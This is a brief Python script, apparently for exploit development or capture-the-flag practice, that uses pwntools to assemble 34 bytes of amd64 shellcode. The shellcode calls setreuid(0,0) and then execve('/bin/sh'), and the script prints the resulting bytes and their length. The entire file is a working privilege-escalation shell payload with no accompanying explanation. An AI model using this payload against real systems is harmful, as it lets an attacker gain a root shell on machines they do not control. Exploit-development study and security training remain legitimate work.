from pwn import *

# Shellcode for setreuid(0,0) + execve("/bin/sh",0,0)
context.arch = "amd64"
shellcode = """
xor rax, rax
push rax
push rax
push rax
pop rdi
pop rsi
pop rdx
mov al, 0x71
syscall
mov rcx, 0x68732f6e69622f41             
shr rcx, 0x8                            
push rcx
push rsp
pop rdi
mov al, 0x3b                            
syscall
"""

shellcode = asm(shellcode)
log.info(f"bytes of the shellcode: {shellcode}")            
log.info(f"lenght of the shellcode: {len(shellcode)}")        # 34 bytes shellcode
